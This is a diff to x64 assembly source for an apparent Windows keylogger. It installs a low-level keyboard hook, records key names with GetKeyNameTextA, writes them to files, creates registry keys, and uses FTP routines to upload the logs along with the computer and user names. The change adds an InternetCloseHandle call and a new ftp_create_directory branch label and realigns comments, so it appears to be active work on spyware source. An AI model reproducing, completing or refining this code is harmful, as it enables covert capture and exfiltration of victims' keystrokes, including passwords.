@@ -35,6 +35,7 @@ extern GetKeyNameTextA :proc
 extern WriteFile :proc
 extern CallNextHookEx :proc
 extern ExitProcess :proc
+extern InternetCloseHandle :proc
 
 MAX_PATH equ 260
 MAX_COMPUTERNAME_LENGTH equ 15
@@ -91,10 +92,10 @@ start proc                                              ;start proc still needs 
   
   call GetProcessHeap
   
-  mov r13, MAX_PATH+MAX_COMPUTERNAME_LENGTH+UNLEN+2 ;check if more space needed for optimization
+  mov r13, MAX_PATH+MAX_COMPUTERNAME_LENGTH+UNLEN+2     ;check if more space needed for optimization
   
   lea r8, [r13+r13]                                     ;WARNING, optimize to lea r8, [rbp+rbp]
-  xor edx, edx                                            ;can be null, implied in doc
+  xor edx, edx                                          ;can be null, implied in doc
   mov ecx, eax
   call HeapAlloc
   
@@ -236,7 +237,7 @@ reg_create_key:
   mov byte ptr 0ah[rdi], 0
   
   test rax, rax
-  je ftp_put_file                                         ;could also be ftp_create_directory
+  je ftp_create_directory                                 ;could also be ftp_create_directory
   
   xor rdx, rdx
   mov dword ptr [rsp+r12], edx
@@ -261,6 +262,7 @@ reg_create_key:
   cld
   inc rdi
   
+ftp_create_directory:
   push rbp                                                ;consider adding a label here
   pop rdx
   mov ecx, r13d
@@ -285,7 +287,7 @@ ftp_put_file:
   call GetSystemTime
   
   lods dword ptr [rsi]
-  mov dword ptr -2[rsi], eax                             ;sub rsi, 2
+  mov dword ptr -2[rsi], eax                              ;sub rsi, 2
   
   std
   xor rcx, rcx
@@ -337,7 +339,10 @@ inner_loop:
   call DeleteFileA
   
 open_file:
-  lea rsi, lpSubKey+4                                   ;recycle buffer to store various handles
+  mov ecx, r13d
+  call InternetCloseHandle
+
+  lea rsi, lpSubKey+4                                     ;recycle buffer to store various handles
   
   xor ecx, ecx
   mov cl, OPEN_EXISTING
@@ -439,7 +444,7 @@ LowLevelKeyboardProc proc nCode:dword, wParam:dword, lParam:qword ;check HookPro
   
   mov r12, offset lpSubKey+4
   mov rbx, qword ptr 8[r12]                               ;lpKeyState ;WARNING
-  mov rsi, MAX_PATH+MAX_COMPUTERNAME_LENGTH+UNLEN+2 ;mov esi, 260
+  mov rsi, MAX_PATH+MAX_COMPUTERNAME_LENGTH+UNLEN+2       ;mov esi, 260
   lea rdi, [rbx+rsi]
   mov r13, rdi
   
